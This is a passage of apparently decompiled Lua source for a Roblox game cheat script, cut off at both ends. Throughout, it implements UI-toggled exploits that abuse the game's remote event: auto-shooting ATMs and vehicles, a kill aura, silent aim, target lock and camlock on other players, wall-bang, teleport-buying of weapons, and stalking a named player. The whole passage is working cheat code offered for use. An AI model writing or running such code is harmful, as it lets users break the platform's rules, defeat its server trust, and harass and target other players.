            originalPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.Position

            spawn(function()
              local val322 = false

              while true do
                local openatms = getgenv().openatms

                if openatms and task.wait() then
                  local val323 = nil

                  for index5, value57 in ipairs(workspace.Cashiers:GetChildren()) do
                    local val324 = value57.Name ~= "VAULT"
                    local humanoid12 = val324

                    if val324 then

                      humanoid12 = (value57:FindFirstChild("Humanoid"))
                        and value57.Humanoid.Health > 0
                    end

                    if humanoid12 then
                      val323 = value57
                      break
                    end
                  end

                  local tool3 = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
                  local val325 = tool3

                  if tool3 then

                    local ammo2 = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("Ammo")
                    local val326 = ammo2

                    if ammo2 then

                      local humanoidRootPart12 = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                      local val327 = humanoidRootPart12

                      if humanoidRootPart12 then
                        local openatms2 = val323

                        if val323 then

                          openatms2 = (val323:FindFirstChild("Open")) and getgenv().openatms
                        end

                        val327 = openatms2
                      end

                      val326 = val327
                    end

                    val325 = val326
                  end

                  if val325 then
                    game.Workspace.Camera.CameraSubject = val323.Open

                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(val323.Open.Position + (Vector3.new(
                      0, 3, 0
                    )))

                    local tool4 = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Tool")
                    local ammo3 = tool4

                    if tool4 then

                      ammo3 = (tool4:FindFirstChild("Ammo")) and tool4.Ammo.Value <= 0
                    end

                    if ammo3 then

                      game:GetService("ReplicatedStorage").MainEvent:FireServer("Reload", tool4)
                    end

                    game:GetService("ReplicatedStorage").MainEvent:FireServer("ShootGun", tool4.Handle, game.Players.LocalPlayer.Character.HumanoidRootPart.Position, val323.Open.Position, val323.Open, Vector3.new(
                      0, 0, -1
                    ))

                    val322 = false
                  else

                    if not val322 and originalPosition then
                      getgenv().csync = false

                      game.Workspace.Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
                      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(originalPosition)

                      val322 = true
                    end
                  end
                else
                  break
                end
              end

              return
            end)
          else
            getgenv().csync = false
            getgenv().openatms = false
          end

          return
        end)

        getgenv().destroyvehicles = false

        function waitLoop6()

          while true do
            local destroyvehicles = getgenv().destroyvehicles

            if destroyvehicles and task.wait() then

              for key52, value58 in pairs(game.Workspace.Vehicles:GetChildren()) do

                local character34 = game:GetService("Players").LocalPlayer.Character
                local val328 = character34

                if character34 then

                  local humanoidRootPart13 = game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                  local val329 = humanoidRootPart13

                  if humanoidRootPart13 then

                    local tool5 = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool")
                    local ammo4 = tool5

                    if tool5 then

                      ammo4 = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("Ammo")
                    end

                    val329 = ammo4
                  end

                  val328 = val329
                end

                if val328 then
                  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(value58.Position + (Vector3.new(
                    0, 3, 0
                  )))

                  local mainEvent5 = game:GetService("ReplicatedStorage").MainEvent

                  local character35 = game:GetService("Players").LocalPlayer.Character

                  mainEvent5:FireServer(
                    "ShootGun", character35:FindFirstChildOfClass("Tool").Handle, game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position, value58.Position, value58, Vector3.new(0, 0, -1)
                  )

                  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position)
                end
              end
            else
              break
            end
          end

          return
        end

        val71 = ui

        ui:AddToggle(aimlocks, "destroy all vehicles", false, function(p51)
          getgenv().destroyvehicles = p51

          if p51 then
            spawn(waitLoop6)
          end

          return
        end)

        getgenv().KillAura = false
        getgenv().FriendCheck = false
        getgenv().Range = 70

        function waitLoop7()

          while true do
            local killAura = getgenv().KillAura

            if killAura and task.wait() then

              local character36 = game:GetService("Players").LocalPlayer.Character
              local val330 = character36

              if character36 then

                local humanoidRootPart14 = game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                local val331 = humanoidRootPart14

                if humanoidRootPart14 then

                  local tool6 = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool")
                  local ammo5 = tool6

                  if tool6 then

                    ammo5 = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("Ammo")
                  end

                  val331 = ammo5
                end

                val330 = val331
              end

              if val330 then

                local players5 = game:GetService("Players")

                for index6, value59 in ipairs(players5:GetPlayers()) do

                  local playersService2 = value59 ~= game:GetService("Players").LocalPlayer
                  local val332 = playersService2

                  if playersService2 then
                    local character37 = value59.Character
                    local val333 = character37

                    if character37 then

                      local humanoidRootPart15 = value59.Character:FindFirstChild("HumanoidRootPart")
                      local val334 = humanoidRootPart15

                      if humanoidRootPart15 then

                        local bodyEffects2 = value59.Character:FindFirstChild("BodyEffects")
                        local val335 = bodyEffects2

                        if bodyEffects2 then

                          local kO2 = value59.Character.BodyEffects:FindFirstChild("K.O")
                          local val336 = kO2

                          if kO2 then

                            local dead2 = value59.Character.BodyEffects:FindFirstChild("Dead")
                            local val337 = dead2

                            if dead2 then

                              local gRABBING_CONSTRAINT2 = not (value59.Character:FindFirstChild("GRABBING_CONSTRAINT"))
                              local val338 = gRABBING_CONSTRAINT2

                              if gRABBING_CONSTRAINT2 then
                                local val339 = not value59.Character.BodyEffects["K.O"].Value
                                local val340 = val339

                                if val339 then
                                  local val341 = not value59.Character.BodyEffects.Dead.Value
                                  local val342 = val341

                                  if val341 then
                                    local dataFolder3 = value59:FindFirstChild("DataFolder")
                                    local val343 = dataFolder3

                                    if dataFolder3 then

                                      local information3 = value59.DataFolder:FindFirstChild("Information")
                                      local val344 = information3

                                      if information3 then

                                        local crew3 = value59.DataFolder.Information:FindFirstChild("Crew")
                                        local val345 = crew3

                                        if crew3 then

                                          local dataFolder4 = game:GetService("Players").LocalPlayer:FindFirstChild("DataFolder")
                                          local val346 = dataFolder4

                                          if dataFolder4 then

                                            local information4 = game:GetService("Players").LocalPlayer.DataFolder:FindFirstChild("Information")
                                            local val347 = information4

                                            if information4 then

                                              local crew4 = game:GetService("Players").LocalPlayer.DataFolder.Information:FindFirstChild("Crew")
                                              local val348 = crew4

                                              if crew4 then
                                                val348 = value59.DataFolder.Information.Crew.Value
                                                  == game:GetService("Players").LocalPlayer.DataFolder.Information.Crew.Value
                                              end

                                              val347 = val348
                                            end

                                            val346 = val347
                                          end

                                          val345 = val346
                                        end

                                        val344 = val345
                                      end

                                      local val349 = not val344
                                      local val350 = val349

                                      if val349 then
                                        local friendCheck2 = getgenv().FriendCheck
                                        local isFriendsWith2 = friendCheck2

                                        if friendCheck2 then

                                          isFriendsWith2 = game:GetService("Players").LocalPlayer:IsFriendsWith(value59.UserId)
                                        end

                                        val350 = not isFriendsWith2
                                      end

                                      val343 = val350
                                    end

                                    val342 = val343
                                  end

                                  val340 = val342
                                end

                                val338 = val340
                              end

                              val337 = val338
                            end

                            val336 = val337
                          end

                          val335 = val336
                        end

                        val334 = val335
                      end

                      val333 = val334
                    end

                    val332 = val333
                  end

                  if val332 then
                    if (value59.Character.HumanoidRootPart.Position
                        - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                      < getgenv().Range then

                      local mainEvent6 = game:GetService("ReplicatedStorage").MainEvent

                      local character38 = game:GetService("Players").LocalPlayer.Character

                      mainEvent6:FireServer(
                        "ShootGun", character38:FindFirstChildOfClass("Tool").Handle, game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position, value59.Character.HumanoidRootPart.Position, value59.Character.Head, Vector3.new(0, 0, -1)
                      )
                    end
                  end
                end
              end
            else
              break
            end
          end

          return
        end

        val72 = ui

        ui:AddToggle(aimlocks, "Kill Aura", false, function(p52)
          getgenv().KillAura = p52

          if p52 then
            spawn(waitLoop7)
          end

          return
        end)

        val73 = ui

        ui:AddToggle(aimlocks, "Friends Check", false, function(friendCheck3)
          getgenv().FriendCheck = friendCheck3
          return
        end)

        val74 = ui

        ui:AddSlider(aimlocks, "Kill Aura Range", 1, 100, getgenv().Range, function(range)
          getgenv().Range = range
          return
        end)

        getgenv().FOVSize = 150
        getgenv().CircleVisible = true

        val75 = ui

        ui:AddToggle(aimlocks, "Silent aim", false, function(p53)
          SilentAimEnabled = p53

          for index7, value60 in ipairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if (value60:IsA("Tool")) then
              value60.Parent = game.Players.LocalPlayer.Backpack
              value60.Parent = game.Players.LocalPlayer.Character
            end
          end

          local val351

          if SilentAimEnabled then
            if not SilentAimFOVCircle then
              SilentAimFOVCircle = Drawing.new("Circle")
            end

            SilentAimFOVCircle.Color = Color3.new(0, 0, 0)
            SilentAimFOVCircle.Filled = false
            SilentAimFOVCircle.Radius = getgenv().FOVSize
            SilentAimFOVCircle.Visible = getgenv().CircleVisible

            game:GetService("RunService").RenderStepped:Connect(function()

              if SilentAimFOVCircle then
                SilentAimFOVCircle.Position = Vector2.new(workspace.CurrentCamera.ViewportSize.X
                  / 2, workspace.CurrentCamera.ViewportSize.Y
                  / 2)

                SilentAimFOVCircle.Visible = SilentAimEnabled and getgenv().CircleVisible
                SilentAimFOVCircle.Radius = getgenv().FOVSize
              end

              return
            end)

            local userInputService7 = game:GetService("UserInputService")
            val351 = false

            userInputService7.InputBegan:Connect(function(input4, p54)
              local val352 = p54 or input4.UserInputType ~= Enum.UserInputType.MouseButton1

              if val352 then
                return
              else
                val351 = true
                task.wait(0.2)

                if val351 then
                  local character39 = game.Players.LocalPlayer.Character
                  local tool7 = character39

                  if character39 then

                    tool7 = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
                  end

                  local element7 = tool7
                  local element8 = getClosestPlayerToCenter()
                  local handle = element7

                  if element7 then

                    handle = (element7:FindFirstChild("Handle")) and element8
                  end

                  if handle then

                    game:GetService("ReplicatedStorage").MainEvent:FireServer("ShootGun", element7.Handle, game.Players.LocalPlayer.Character.HumanoidRootPart.Position, element8.Position, element8, Vector3.new(
                      0, 0, -1
                    ))
                  end
                end

                return
              end
            end)

            userInputService7.InputEnded:Connect(function(input5)
              if input5.UserInputType == Enum.UserInputType.MouseButton1 then
                val351 = false
              end

              return
            end)
          else
            if SilentAimFOVCircle then
              SilentAimFOVCircle.Visible = false
            end
          end

          return
        end)

        function getClosestPlayerToCenter()
          local vector = Vector2.new(
            workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y / 2
          )

          local huge = math.huge

          local players6 = game:GetService("Players")
local val353

          for index8, value61 in ipairs(players6:GetPlayers()) do
            local localPlayer10 = value61 ~= game.Players.LocalPlayer
            local val354 = localPlayer10

            if localPlayer10 then
              local character40 = value61.Character
              local head = character40

              if character40 then

                head = value61.Character:FindFirstChild("Head")
              end

              val354 = head
            end

            if val354 then
              local head2 = value61.Character.Head

              local val355 = { workspace.CurrentCamera:WorldToViewportPoint(head2.Position) }
              local element9 = val355[1]

              if val355[2] then
                local magnitude = (vector - (Vector2.new(element9.X, element9.Y))).Magnitude

                if magnitude < huge and magnitude <= getgenv().FOVSize then
                  val353 = head2
                  huge = magnitude
                end
              end
            end
          end

          return val353
        end

        line = Drawing.new("Line")
        line.Color = Color3.new(1, 1, 1)
        line.Thickness = 2
        line.Transparency = 1
        line.Visible = false

        game:GetService("RunService").RenderStepped:Connect(function()

          if not SilentAimEnabled then
            line.Visible = false
            return
          else
            local element10 = getClosestPlayerToCenter()

            if element10 then

              local worldToViewportPoint = workspace.CurrentCamera:WorldToViewportPoint(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position)

              local worldToViewportPoint2 = workspace.CurrentCamera:WorldToViewportPoint(element10.Position)

              line.From = Vector2.new(worldToViewportPoint.X, worldToViewportPoint.Y)
              line.To = Vector2.new(worldToViewportPoint2.X, worldToViewportPoint2.Y)
              line.Visible = true
            else
              line.Visible = false
            end

            return
          end
        end)

        function iterate5(val356)

          if (val356:IsA("Tool")) then
            for key53, value62 in pairs(val356:GetChildren()) do
              local localScript = value62:IsA("LocalScript")
              local val357 = localScript

              if localScript then

                val357 = (value62.Name:sub(1, 9)) == "GunClient"
              end

              if val357 then
                value62.Enabled = not SilentAimEnabled
              end
            end

            val356.Equipped:Connect(function()

              val356.Activated:Connect(function()

                if SilentAimEnabled then
                  local val358 = getClosestPlayerToCenter()
                  local character41 = game.Players.LocalPlayer.Character
                  local tool8 = character41

                  if character41 then

                    tool8 = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
                  end

                  local element11 = tool8
                  local handle2 = element11

                  if element11 then

                    handle2 = (element11:FindFirstChild("Handle")) and val358
                  end

                  if handle2 then

                    game:GetService("ReplicatedStorage").MainEvent:FireServer("ShootGun", element11.Handle, game.Players.LocalPlayer.Character.HumanoidRootPart.Position, val358.Position, val358, Vector3.new(
                      0, 0, -1
                    ))
                  end
                end

                return
              end)

              return
            end)
          end

          return
        end

        game.Players.LocalPlayer.Backpack.ChildAdded:Connect(iterate5)

        game.Players.LocalPlayer.Character.ChildAdded:Connect(iterate5)

        game.Players.LocalPlayer.CharacterAdded:Connect(function()
          game.Players.LocalPlayer.Backpack.ChildAdded:Connect(iterate5)

          game.Players.LocalPlayer.Character.ChildAdded:Connect(iterate5)
          return
        end)

        val187 = false
        val188 = 8
        val189 = 18
        val190 = 0
        val191 = false
        val192 = nil
        localPlayer2 = game.Players.LocalPlayer

        function iterate2(val359)

          if (val359:IsA("Tool")) then

            val359.Equipped:Connect(function()

              for key54, value63 in pairs(val359:GetChildren()) do
                local localScript2 = value63:IsA("LocalScript")
                local val360 = localScript2

                if localScript2 then

                  val360 = (value63.Name:sub(1, 9)) == "GunClient"
                end

                if val360 then
                  value63.Enabled = false
                end
              end

              val359.Activated:Connect(function()

                if val191 then
                  local val361 = val192
                  local val362 = val361

                  if val361 then
                    local character42 = val192.Character
                    local head3 = character42

                    if character42 then

                      head3 = val192.Character:FindFirstChild("Head")
                    end

                    val362 = head3
                  end

                  if val362 then

                    local tool9 = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")

                    local handle3 = tool9 and tool9:FindFirstChild("Handle")

                    if handle3 then

                      game:GetService("ReplicatedStorage").MainEvent:FireServer("ShootGun", handle3, game.Players.LocalPlayer.Character.HumanoidRootPart.Position, val192.Character.Head.Position, val192.Character.Head, Vector3.new(
                        0, 0, -1
                      ))
                    end
                  end
                else
                  for key55, value64 in pairs(val359:GetChildren()) do
                    local localScript3 = value64:IsA("LocalScript")
                    local val363 = localScript3

                    if localScript3 then

                      val363 = (value64.Name:sub(1, 9)) == "GunClient"
                    end

                    if val363 then
                      value64.Enabled = true
                    end
                  end
                end

                return
              end)

              return
            end)
          end

          return
        end

        getMouse = localPlayer2:GetMouse()

        function iterate3()
          local huge2 = math.huge

          local p = val193.Hit and val193.Hit.p
          val192 = nil

          if not p then
            return nil
          else

            local players7 = game:GetService("Players")

            for index9, value65 in ipairs(players7:GetPlayers()) do
              local localPlayer11 = value65 ~= game.Players.LocalPlayer
              local val364 = localPlayer11

              if localPlayer11 then
                local character43 = value65.Character
                local humanoidRootPart16 = character43

                if character43 then

                  humanoidRootPart16 = value65.Character:FindFirstChild("HumanoidRootPart")
                end

                val364 = humanoidRootPart16
              end

              if val364 then
                local magnitude2 = (p - value65.Character.HumanoidRootPart.Position).magnitude

                if magnitude2 < huge2 and magnitude2 <= 100 then
                  huge2 = magnitude2
                  val192 = value65
                end
              end
            end

            return val192
          end
        end

        val193 = getMouse
        val194 = iterate3

        function helper8()
          if not val191 then
            val192 = iterate3()

            if val192 then
              val191 = true

              notify({
                Description = "Locked on " .. val192.DisplayName, Title = "Target Lock", Duration = 2, })
            end
          else
            val191 = false
            notify({ Description = "Unlocked from target", Title = "Target Lock", Duration = 2 })
          end

          return
        end

        val195 = iterate2
        val196 = helper8

        game:GetService("RunService").RenderStepped:Connect(function()
          local val365 = val191
          local val366 = val365

          if val365 then
            local val367 = val192
            local val368 = val367

            if val367 then
              local character44 = val192.Character
              local humanoidRootPart17 = character44

              if character44 then

                humanoidRootPart17 = val192.Character:FindFirstChild("HumanoidRootPart")
              end

              val368 = humanoidRootPart17
            end

            val366 = val368
          end

          if val366 then
            if val187 then
              local position6 = val192.Character.HumanoidRootPart.Position
              local val369 = (tick()) * val188

              local val370 = position6 + (Vector3.new(
                (math.sin(val369)) * val189, val190, (math.cos(val369)) * val189
              ))

              local character45 = game.Players.LocalPlayer.Character

              if character45 then
                character45.HumanoidRootPart.CFrame = CFrame.new(val370, position6)
              end
            end
          end

          return
        end)

        val197 = false
        val76 = ui

        ui:AddToggle(aimlocks, "target Lock", false, function(p57)
          val197 = p57
          local lock

          if p57 then

            if (game.Players.LocalPlayer.Backpack:FindFirstChild("Lock")) then

              game.Players.LocalPlayer.Backpack.Lock:Destroy()
            end

            lock = Instance.new("Tool")
            lock.RequiresHandle = false
            lock.Name = "Lock"

            lock.Activated:Connect(helper8)

            game.Players.LocalPlayer.Backpack.ChildAdded:Connect(iterate2)

            game.Players.LocalPlayer.Character.ChildAdded:Connect(iterate2)

            game.Players.LocalPlayer.CharacterAdded:Connect(function()

              if touchEnabled then
                lock.Parent = game.Players.LocalPlayer.Backpack
              end

              game.Players.LocalPlayer.Backpack.ChildAdded:Connect(iterate2)

              game.Players.LocalPlayer.Character.ChildAdded:Connect(iterate2)
              return
            end)

            if touchEnabled then
              lock.Parent = game.Players.LocalPlayer.Backpack
            end
          else

            if (game.Players.LocalPlayer.Backpack:FindFirstChild("Lock")) then

              game.Players.LocalPlayer.Backpack.Lock:Destroy()
            end
          end

          return
        end)

        val77 = ui

        ui:AddKeybind(aimlocks, "target lock Bind", function()
          if val197 then
            helper8()
          end

          return
        end, Enum.KeyCode.Z)

        val78 = ui

        ui:AddToggle(aimlocks, "Wall Bang", false, function(p58)

          local replicatedStorage = game:FindService("ReplicatedStorage")
          local val371, mainModule = pcall(require, replicatedStorage:WaitForChild("MainModule"))

          if val371 and mainModule then
            local val372 = p58

            if p58 then
              local object2 = workspace
              local object3 = workspace
              local object4 = workspace

              val372 = {
                (object2:WaitForChild("Vehicles")), (object3:WaitForChild("MAP")), object4:WaitForChild("Ignored"), }
            end

            mainModule.Ignored = val372 or {}
          else
            notify({
              Title = "Wall Bang", Description = "Your executor does not support this feature.", Duration = 2, })
          end

          return
        end)

        val198 = nil
        val199 = false

        getMouse2 = game.Players.LocalPlayer:GetMouse()

        function iterate6()
          local huge3 = math.huge
          local val373 = getMouse2.Hit.p
          val198 = nil

          local players8 = game:GetService("Players")

          for index10, value66 in ipairs(players8:GetPlayers()) do
            local localPlayer12 = value66 ~= game.Players.LocalPlayer
            local val374 = localPlayer12

            if localPlayer12 then
              local character46 = value66.Character
              local humanoidRootPart18 = character46

              if character46 then

                humanoidRootPart18 = value66.Character:FindFirstChild("HumanoidRootPart")
              end

              val374 = humanoidRootPart18
            end

            if val374 then
              local magnitude3 = (val373 - value66.Character.HumanoidRootPart.Position).magnitude

              if magnitude3 < huge3 and magnitude3 <= 80 then
                val198 = value66
                huge3 = magnitude3
              end
            end
          end

          return val198
        end

        function helper18()

          if not val199 then
            val198 = iterate6()

            if val198 then
              val199 = true

              local humanoidRootPart19 = val198.Character.HumanoidRootPart
              humanoidRootPart19.Size = Vector3.new(38, 38, 38)
              humanoidRootPart19.CanCollide = false

              notify({
                Description = "Locked on " .. val198.DisplayName, Title = "camlock", Duration = 2, })
            end
          else
            val199 = false
            local val375 = val198
            local val376 = val375

            if val375 then
              local character47 = val198.Character
              local humanoidRootPart20 = character47

              if character47 then

                humanoidRootPart20 = val198.Character:FindFirstChild("HumanoidRootPart")
              end

              val376 = humanoidRootPart20
            end

            if val376 then
              local humanoidRootPart21 = val198.Character.HumanoidRootPart
              humanoidRootPart21.Size = Vector3.new(2, 2, 1)
              humanoidRootPart21.CanCollide = false
            end

            notify({ Description = "Unlocked from target", Title = "camlock", Duration = 2 })
          end

          return
        end

        game:GetService("RunService").RenderStepped:Connect(function()
          local val377 = val199
          local val378 = val377

          if val377 then
            local val379 = val198
            local val380 = val379

            if val379 then
              local character48 = val198.Character
              local humanoidRootPart22 = character48

              if character48 then

                humanoidRootPart22 = val198.Character:FindFirstChild("HumanoidRootPart")
              end

              val380 = humanoidRootPart22
            end

            val378 = val380
          end

          if val378 then
            if val187 then
              local position7 = val198.Character.HumanoidRootPart.Position
              local val381 = (tick()) * val188

              local val382 = position7 + (Vector3.new(
                (math.sin(val381)) * val189, val190, (math.cos(val381)) * val189
              ))

              local character49 = game.Players.LocalPlayer.Character

              if character49 then
                character49.HumanoidRootPart.CFrame = CFrame.new(val382, position7)
              end
            end

            workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position, val198.Character.HumanoidRootPart.Position
              + val198.Character.HumanoidRootPart.Velocity * 0.135)
          end

          return
        end)

        val200 = false
        val79 = ui

        ui:AddToggle(aimlocks, "Camlock", false, function(p60)
          val200 = p60
          local camlock

          if p60 then

            if (game.Players.LocalPlayer.Backpack:FindFirstChild("camlock")) then

              game.Players.LocalPlayer.Backpack.camlock:Destroy()
            end

            camlock = Instance.new("Tool")
            camlock.RequiresHandle = false
            camlock.Name = "camlock"

            camlock.Activated:Connect(helper18)

            game.Players.LocalPlayer.CharacterAdded:Connect(function(character50)
              if touchEnabled then
                camlock.Parent = game.Players.LocalPlayer.Backpack
              end

              return
            end)

            if touchEnabled then
              camlock.Parent = game.Players.LocalPlayer.Backpack
            end
          else

            if (game.Players.LocalPlayer.Backpack:FindFirstChild("camlock")) then

              game.Players.LocalPlayer.Backpack.camlock:Destroy()
            end
          end

          return
        end)

        val80 = ui

        ui:AddKeybind(aimlocks, "Camlock Bind", function()
          if val200 then
            helper18()
          end

          return
        end, Enum.KeyCode.G)

        val81 = ui

        ui:AddToggle(aimlocks, "orbit", false, function(p61)
          val187 = p61
          return
        end)

        val82 = ui

        ui:AddSlider(aimlocks, "orbit speed", 1, 13, 4, function(p62)
          val188 = p62
          return
        end)

        val83 = ui

        ui:AddSlider(aimlocks, "orbit distance", 1, 40, 9, function(p63)
          val189 = p63
          return
        end)

        val84 = ui

        ui:AddSlider(aimlocks, "orbit height", -5, 40, 0, function(p64)
          val190 = p64
          return
        end)

        name = nil
        val85 = ui

        ui:AddTextbox(target, "Player Name", "Type Here...", function(p65)
          local players9 = game.Players

          for index11, value67 in ipairs(players9:GetPlayers()) do
            local findResult3 = string.find(string.lower(value67.Name), string.lower(p65), 1, true)

            if findResult3
              or string.find(string.lower(value67.DisplayName), string.lower(p65), 1, true) then
              _G.targetPlayer = value67
              name = value67.Name

              notify({
                Description = "Target found!: " .. value67.Name, Title = "TBO", Duration = 4, })

              return
            end
          end

          name = p65
          notify({ Description = "target not found: " .. p65, Title = "TBO", Duration = 4 })
          return
        end)

        game.Players.PlayerRemoving:Connect(function(player)
          if player.Name == name then
            notify({ Description = player.Name .. " has left.", Title = "TBO", Duration = 5 })
          end

          return
        end)

        game.Players.PlayerAdded:Connect(function(player2)
          if player2.Name == name then
            _G.targetPlayer = player2

            notify({
              Description = player2.Name .. " has Rejoined.", Title = "TBO", Duration = 5, })
          end

          return
        end)

        val201 = false

        function GetKnifePrice()
          local shop2 = game.Workspace.Ignored.Shop

          for key56, value68 in pairs(shop2:GetChildren()) do
            local model2 = value68:IsA("Model")
            local knife = model2

            if model2 then

              knife = value68.Name:find("%[Knife%]")
            end

            if knife then
              return value68
            end
          end

          return nil
        end

        function KnifeAttack()
          local element12 = GetKnifePrice()
          local val383 = element12 and not val201

          if val383 then

            game.Players.LocalPlayer.Backpack:FindFirstChild("[Knife]")

            repeat
              game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = element12.Head.CFrame
                * (CFrame.new(0, -5, 0))

              game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(
                0, 0, 0
              )

              local clickDetector3 = element12:FindFirstChildWhichIsA("ClickDetector")

              if clickDetector3 then
                fireclickdetector(clickDetector3)
              end

              task.wait(0.01)
              backpack2 = game.Players.LocalPlayer.Backpack
            until (backpack2:FindFirstChild("[Knife]"))

            val201 = true
          end

          if (game.Players.LocalPlayer.Character:FindFirstChild("[Knife]")) then

            game.Players.LocalPlayer.Character:FindFirstChild("[Knife]"):Activate()
          else
            game.Players.LocalPlayer.Backpack:FindFirstChild("[Knife]").Parent = game.Players.LocalPlayer.Character
          end

          return
        end

        function GetBatPrice()
          local shop3 = game.Workspace.Ignored.Shop

          for key57, value69 in pairs(shop3:GetChildren()) do
            local model3 = value69:IsA("Model")
            local bat = model3

            if model3 then

              bat = value69.Name:find("%[Bat%]")
            end

            if bat then
              return value69
            end
          end

          return nil
        end

        function BatAttack()
          local element13 = GetBatPrice()
          local val384 = element13 and not batPurchased

          if val384 then

            game.Players.LocalPlayer.Backpack:FindFirstChild("[Bat]")

            repeat
              game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = element13.Head.CFrame
                * (CFrame.new(0, -5, 0))

              game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(
                0, 0, 0
              )

              local clickDetector4 = element13:FindFirstChildWhichIsA("ClickDetector")

              if clickDetector4 then
                fireclickdetector(clickDetector4)
              end

              task.wait(0.01)
              backpack4 = game.Players.LocalPlayer.Backpack
            until (backpack4:FindFirstChild("[Bat]"))
          end

          if (game.Players.LocalPlayer.Character:FindFirstChild("[Bat]")) then

            game.Players.LocalPlayer.Character:FindFirstChild("[Bat]"):Activate()
          else
            game.Players.LocalPlayer.Backpack:FindFirstChild("[Bat]").Parent = game.Players.LocalPlayer.Character
          end

          return
        end

        val202 = false

        function GetPitchPrice()
          local shop4 = game.Workspace.Ignored.Shop

          for key58, value70 in pairs(shop4:GetChildren()) do
            local model4 = value70:IsA("Model")
            local pitchfork = model4

            if model4 then

              pitchfork = value70.Name:find("%[Pitchfork%]")
            end

            if pitchfork then
              return value70
            end
          end

          return nil
        end

        function PitchAttack()
          local element14 = GetPitchPrice()
          local val385 = element14 and not val202

          if val385 then

            game.Players.LocalPlayer.Backpack:FindFirstChild("[Pitchfork]")

            repeat
              game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = element14.Head.CFrame
                * (CFrame.new(0, -5, 0))

              game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(
                0, 0, 0
              )

              local clickDetector5 = element14:FindFirstChildWhichIsA("ClickDetector")

              if clickDetector5 then
                fireclickdetector(clickDetector5)
              end

              task.wait(0.01)
              backpack6 = game.Players.LocalPlayer.Backpack
            until (backpack6:FindFirstChild("[Pitchfork]"))

            val202 = true
          end

          if (game.Players.LocalPlayer.Character:FindFirstChild("[Pitchfork]")) then

            game.Players.LocalPlayer.Character:FindFirstChild("[Pitchfork]"):Activate()
          else
            game.Players.LocalPlayer.Backpack:FindFirstChild("[Pitchfork]").Parent = game.Players.LocalPlayer.Character
          end

          return
        end

        val203 = false
        val204 = false

        function GetRiflePrice()
          local shop5 = game.Workspace.Ignored.Shop

          for key59, value71 in pairs(shop5:GetChildren()) do
            local model5 = value71:IsA("Model")
            local rifle = model5

            if model5 then

              rifle = value71.Name:find("%[Rifle%]")
            end

            if rifle then
              return value71
            end
          end

          return nil
        end

        function AutoReload()

          while val204 do

            local tool10 = game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool")
            local ammo6 = tool10

            if tool10 then

              ammo6 = (tool10:FindFirstChild("Ammo")) and tool10.Ammo.Value <= 0
            end

            if ammo6 then

              game:GetService("ReplicatedStorage").MainEvent:FireServer("Reload", tool10)
            end

            task.wait(0.2)
          end

          return
        end

        function RifleAttack()
          val204 = true
          task.spawn(AutoReload)
          local val386 = GetRiflePrice()
          local val387 = val386

          if val386 then
            local val388 = not val203
            local localPlayer13 = val388

            if val388 then

              localPlayer13 = not (game.Players.LocalPlayer.Character:FindFirstChild("[Rifle]"))
            end

            val387 = localPlayer13
          end

          local backpack8

          if val387 then

            game.Players.LocalPlayer.Backpack:FindFirstChild("[Rifle]")

            repeat
              game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = val386.Head.CFrame
                * (CFrame.new(0, -5, 0))

              game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(
                0, 0, 0
              )

              local clickDetector6 = val386:FindFirstChildWhichIsA("ClickDetector")

              if clickDetector6 then
                fireclickdetector(clickDetector6)
              end

              task.wait(0.01)
              backpack8 = game.Players.LocalPlayer.Backpack
            until (backpack8:FindFirstChild("[Rifle]"))

            val203 = true
          end

          CheckAndBuyRifleAmmo()

          if (game.Players.LocalPlayer.Character:FindFirstChild("[Rifle]")) then
            local targetPlayer = _G.targetPlayer
            local val389 = targetPlayer

            if targetPlayer then
              local character51 = _G.targetPlayer.Character
              local val390 = character51

              if character51 then
                local bodyEffects3 = _G.targetPlayer.Character.BodyEffects
                local val391 = bodyEffects3

                if bodyEffects3 then

                  local kO3 = _G.targetPlayer.Character.BodyEffects:FindFirstChild("K.O")
                  local val392 = kO3

                  if kO3 then

                    val392 = not _G.targetPlayer.Character.BodyEffects:FindFirstChild("K.O").Value
                  end

                  val391 = val392
                end

                val390 = val391
              end

              val389 = val390
            end

            if val389 then

              local mainEvent7 = game:GetService("ReplicatedStorage").MainEvent

              local character52 = game:GetService("Players").LocalPlayer.Character

              mainEvent7:FireServer(
